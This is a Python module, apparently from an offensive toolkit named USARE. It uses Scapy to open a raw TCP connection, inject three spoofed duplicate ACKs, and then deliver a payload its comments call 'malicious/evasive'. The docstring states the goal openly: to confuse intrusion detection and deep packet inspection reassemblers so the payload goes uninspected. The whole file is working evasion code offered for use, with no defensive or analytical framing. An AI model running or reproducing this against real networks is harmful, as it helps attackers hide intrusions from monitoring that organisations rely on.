"""
USARE TCP Duplicate ACK Injection (Fast-Retransmit Spoofing)

This evasion module exploits the TCP Fast Retransmit mechanism found in
all modern TCP/IP stacks. When a receiver receives out-of-order segments,
it immediately sends a Duplicate ACK (DupACK) for the last in-order byte.
Three Duplicate ACKs trigger a Fast Retransmit on the sender side.

By injecting fake Duplicate ACKs into a legitimate TCP stream *just before*
sending the malicious application payload (e.g., HTTP GET/POST), this
module intentionally confuses passive network Intrusion Detection Systems
(IDS) and deep packet inspection (DPI) stream reassemblers. The IDS
assumes heavy packet loss and enters a recovery state, often failing to
inspect the subsequent data packet successfully, while the target OS
simply ignores the extra ACKs and processes the payload normally.
"""

import logging
import random
import time
from typing import Optional, Dict

try:
    from scapy.all import IP, TCP, sr1, conf, send
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

logger = logging.getLogger("usare.tcp_dup_ack")

class TCPDupAckInjector:
    """Manages full 3-way handshake and Duplicate ACK injections."""

    def __init__(self, interface: Optional[str] = None, timeout: float = 2.0):
        self.interface = interface
        self.timeout = timeout
        self._rng = random.SystemRandom()
        if not HAS_SCAPY:
            logger.warning("[DupACK] Scapy not installed. TCP Dup ACK Injection disabled.")

    def inject_and_send(self, target: str, port: int, payload: bytes) -> Dict:
        """
        Completes a TCP Handshake, injects 3 Duplicate ACKs, then sends the payload.
        """
        result = {
            "target": target,
            "port": port,
            "handshake_completed": False,
            "dup_acks_injected": 0,
            "payload_delivered": False,
            "response_received": False,
            "response_data": b"",
            "latency_ms": 0.0
        }

        if not HAS_SCAPY:
            return result

        sport = self._rng.randint(49152, 65535)
        isn = self._rng.randint(1000, 4294967000)

        t0 = time.time()
        
        # 1. Send SYN
        ip = IP(dst=target)
        syn = TCP(sport=sport, dport=port, flags="S", seq=isn)
        
        kwargs = {"timeout": self.timeout, "verbose": 0}
        if self.interface:
            kwargs["iface"] = self.interface

        syn_ack = sr1(ip / syn, **kwargs)

        if not syn_ack or not syn_ack.haslayer(TCP):
            return result

        if syn_ack[TCP].flags & 0x12 != 0x12:
            return result # Not a SYN-ACK

        result["handshake_completed"] = True
        
        server_seq = syn_ack[TCP].seq
        client_seq = isn + 1
        client_ack = server_seq + 1

        # 2. Complete Handshake (Send ACK)
        ack = TCP(sport=sport, dport=port, flags="A", seq=client_seq, ack=client_ack)
        send(ip / ack, verbose=0, iface=self.interface)

        # 3. Inject 3 Duplicate ACKs (Fast Retransmit Trigger)
        # We send these ACKs with the exact same Sequence and Acknowledgment numbers
        # to simulate that we missed the server's next packet.
        dup_ack = TCP(sport=sport, dport=port, flags="A", seq=client_seq, ack=client_ack)
        
        logger.debug(f"[DupACK] Injecting 3 Duplicate ACKs to {target}:{port}")
        for _ in range(3):
            send(ip / dup_ack, verbose=0, iface=self.interface)
            result["dup_acks_injected"] += 1
            # Micro-sleep to ensure they arrive in distinct packets
            time.sleep(0.005)

        # 4. Send the actual malicious/evasive payload
        logger.debug(f"[DupACK] Delivering payload ({len(payload)} bytes)")
        push_ack = TCP(sport=sport, dport=port, flags="PA", seq=client_seq, ack=client_ack)
        
        response = sr1(ip / push_ack / payload, **kwargs)
        result["payload_delivered"] = True
        
        # 5. Handle Response
        if response and response.haslayer(TCP):
            result["response_received"] = True
            result["latency_ms"] = (time.time() - t0) * 1000
            
            # If there's Raw data in the response, capture it
            import scapy.packet
            if response.haslayer(scapy.packet.Raw):
                result["response_data"] = bytes(response[scapy.packet.Raw].load)
            
            # 6. Teardown gracefully (RST)
            next_client_seq = client_seq + len(payload)
            rst = TCP(sport=sport, dport=port, flags="R", seq=next_client_seq, ack=response[TCP].seq)
            send(ip / rst, verbose=0, iface=self.interface)
            
        return result
